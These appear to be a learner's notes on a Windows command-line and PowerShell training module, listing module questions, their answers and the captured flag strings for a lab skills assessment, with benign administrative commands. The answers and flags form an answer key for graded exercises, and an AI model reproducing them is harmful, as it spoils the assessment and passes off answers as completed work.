-a---           6/14/2022  8:22 AM           4418 passwords.kdbx
-a---            9/9/2020  4:54 PM         696576 Start.exe
-a---           9/11/2021 12:58 PM              0 sticky.gpr
-a---          11/10/2022 10:44 AM      108511752 test.zip
```
#### PowerShell Extensions

| **Extension** | **Description**                                                                                                                 |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| ps1           | The `*.ps1` file extension represents executable PowerShell scripts.                                                            |
| psm1          | The `*.psm1` file extension represents a PowerShell module file. It defines what the module is and what is contained within it. |
| psd1          | The `*.psd1` is a PowerShell data file detailing the contents of a PowerShell module in a table of key/value pairs.             |

Questions:

1. What command can be used to search for regular expression strings from command prompt?
	-> `findstr`

2.Using the skills acquired in this and previous sections, access the target host and search for the file named 'waldo.txt'. Submit the flag found within the file.
	-> first we find the file using the command `where /R C:\Users\ waldo.txt` then `type C:\Users\MTanaka\Favorites\waldo.txt`.
3.What variable scope allows for universal access?
	-> `global` 
4.What command string will stop a service named 'red-light'? (full command as the answer)
	->`sc stop red-light`
5.What Windows executable will allow us to create, query, and modify services on a host?
	->`sc`
6.True or False: A scheduled task can be set to run when a user logs onto a host?
	->` True`
7.Access the target host and take some time to practice working with Scheduled Tasks. Type COMPLETE as the answer when you are ready to move on.
	->`COMPLETE`
8.What command string can we use to view the help documentation for the command Get-Location? (full string).
	->`Get-Help Get-Location`
9.What command can we use to show us our current location on the host system?
	->`Get-Location`
10.What hotkey can be used to clear our input line completely?
	->`Escape`
11.What cmdlet can help us find modules that are loaded into our session?
	->`Get-Module`
12. What module provides us with cmdlets built to manage package installation from the PowerShell Gallery?
	->`PowershellGet`
13.What resource can provide Windows environments with directory services to manage users, computers, and more? (full name not abbreviation)
	->`Active Directory`
14.What PowerShell Cmdlet will display all LOCAL users on a host?
	->`Get-LocalUser`
15.Connect to the target host and search for a domain user with the given name of Robert. What is this users Surname?
	->`Loxley`
16.What Cmdlet has an alias of "cat" ?
	->`Get-Content`
17.What Cmdlet can we use to create new files and folders?
	->`New-Item`
18.What defines the functions our objects have?
	->Methods
	
19.What Cmdlet can show us the properties and methods of an object?

	->Get-Member

20.If we wanted to look through a directory and all sub-directories for something, what modifier would we use with the Get-ChildItem Cmdlet?

	->-Recurse

21.What Cmdlet will show us the current services of a host?
	->get-service
22.If we wanted to start the Windows Defender Service, what command would we use?
	->Start-Service WinDefend
23.What Cmdlet will allow us to execute a command on a remote host?
	->invoke-command
24.A registry entry is made up of two pieces, a 'Key' and ' ' . What is the second piece?
	->values
25.What is the abbreviation for " HKey_Current_User".
	->HKCU
26.What common protocol is used to resolve names to IP addresses.
	->DNS
27.What PowerShell cmdlet will show us the IP configurations of the hosts network adapters.
	->Get-NetIPAddress
28.What command can enable and configure Windows Remote Management on a host?
	->winrm quickconfig

---
## Skills Assessment:

	1.The flag will print in the banner upon successful login on the host via SSH.
	->D0wn_the_rabbit_H0!3
	

![[Pasted image 20250830125857.png]]

	2.Access the host as user1 and read the contents of the file "flag.txt" located in the users Desktop.
	->Nice and Easy!
	
![[Pasted image 20250830130259.png]]

	3.If you search and find the name of this host, you will find the flag for user2.
	->ACADEMY-ICL11

![[Pasted image 20250830130435.png]]

	4.How many hidden files exist on user3's Desktop?
	Since the directories are hidden using -Force and .Count to count the files .   ->101

![[Pasted image 20250830130749.png]]

	5.User4 has a lot of files and folders in their Documents folder. The flag can be found within one of them.
->Digging in The nest

![[Pasted image 20250830131154.png]]
```
Get-ChildItem -Path "C:\Users\User4\Documents" -Recurse -Filter "flag.txt" |Get-Content
```
![[Pasted image 20250830131339.png]]


	6.How many users exist on this host? (Excluding the DefaultAccount and WDAGUtility)
		  -> 14 Excluding two of them.

![[Pasted image 20250830132027.png]]


	7.For this level, you need to find the Registered Owner of the host. The Owner name is the flag.
	-> htb-student

![[Pasted image 20250830132231.png]]

	8.For this level, you must successfully authenticate to the Domain Controller host at 172.16.5.155 via SSH after first authenticating to the target host. This host seems to have several PowerShell modules loaded, and this user's flag is hidden in one of them.
	
Firstly connecting to ssh and then USing Get-Module which shows all modules that are currently loaded in memory for your powershell session.
	->Modules_make_pwsh_run!

![[Pasted image 20250830133827.png]]

	9.This flag is the GivenName of a domain user with the Surname "Flag".

	->Rick
```powershell-session
Get-ADUser -Filter *
```
The parameter `-Filter *` lets us grab all users within Active Directory. Depending on our organization's size, this could produce a ton of output.
![[Pasted image 20250830135218.png]]

	10.Use the tasklist command to print running processes and then sort them in reverse order by name. The name of the process that begins with "vm" is the flag for this user.
	->vmtoolsd.exe

![[Pasted image 20250830135703.png]]



11.
![[Pasted image 20250901204013.png]]